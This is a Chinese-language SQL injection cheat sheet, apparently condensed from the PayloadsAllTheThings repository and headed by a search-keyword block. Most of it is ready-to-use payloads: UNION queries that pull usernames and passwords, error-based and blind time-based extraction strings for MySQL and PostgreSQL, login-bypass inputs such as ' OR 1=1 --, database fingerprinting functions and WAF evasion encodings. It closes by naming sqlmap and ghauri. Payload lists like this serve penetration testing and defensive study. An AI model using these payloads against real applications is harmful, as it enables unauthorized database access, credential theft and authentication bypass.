# SQL Injection - SQL注入

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection SQL注入 SQLi 注入攻击
数据库: MySQL MSSQL PostgreSQL Oracle SQLite Cassandra DB2
别名: SQLi 结构化查询语言注入 数据库注入
攻击类型: Authentication Bypass UNION Based Error Based Blind Time Based Stacked
关键词: information_schema union select sleep benchmark extractvalue updatexml

[CONTENT]

## 漏洞概述

SQL Injection (SQL注入) 是一种安全漏洞，允许攻击者干扰应用程序对数据库的查询。SQL注入是最常见和最严重的Web应用程序漏洞类型之一，使攻击者能够在数据库上执行任意SQL代码。

## 主要攻击类型

### 1. UNION Based Injection (联合查询注入)
利用UNION操作符合并多个SELECT语句的结果

```sql
1' UNION SELECT username, password FROM users --
1' UNION SELECT 1,2,3,4,5 --
```

### 2. Error Based Injection (报错注入)
利用数据库错误信息提取数据

```sql
# MySQL
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -

# PostgreSQL
LIMIT CAST((SELECT version()) as numeric)
```

### 3. Blind Injection (盲注)
- Boolean Based: 通过真/假响应推断数据
- Time Based: 通过响应时间推断数据

```sql
# Boolean Based
1 AND 1=1 -- true
1 AND 1=2 -- false
1 AND ASCII(SUBSTRING(@@version,1,1))=53 --

# Time Based
1 AND SLEEP(5) --
1 AND IF(ASCII(SUBSTRING(VERSION(),1,1))=53,SLEEP(3),0) --
```

### 4. Authentication Bypass (认证绕过)

```sql
' OR '1'='1
' OR 1=1 --
admin'--
' or 1=1 limit 1 --
```

## 数据库识别

| DBMS | 关键字/函数 |
|------|------------|
| MySQL | `conv('a',16,2)`, `connection_id()`, `@@version` |
| MSSQL | `@@CONNECTIONS`, `USER_ID()`, `BINARY_CHECKSUM()` |
| PostgreSQL | `5::int`, `pg_client_encoding()`, `current_database()` |
| Oracle | `ROWNUM`, `RAWTOHEX()` |
| SQLite | `sqlite_version()`, `last_insert_rowid()` |

## WAF 绕过技术

### 空白符替代
```sql
?id=1%09and%091=1  -- Tab
?id=1%0Aand%0A1=1  -- 换行
?id=1/**/and/**/1=1  -- 注释
```

### 等号替代
```sql
SUBSTRING(VERSION(),1,1) LIKE(5)
SUBSTRING(VERSION(),1,1) IN(4,3)
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
```

## 工具

- sqlmap - 自动SQL注入工具
- ghauri - 高级跨平台SQL注入检测利用工具

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/README.md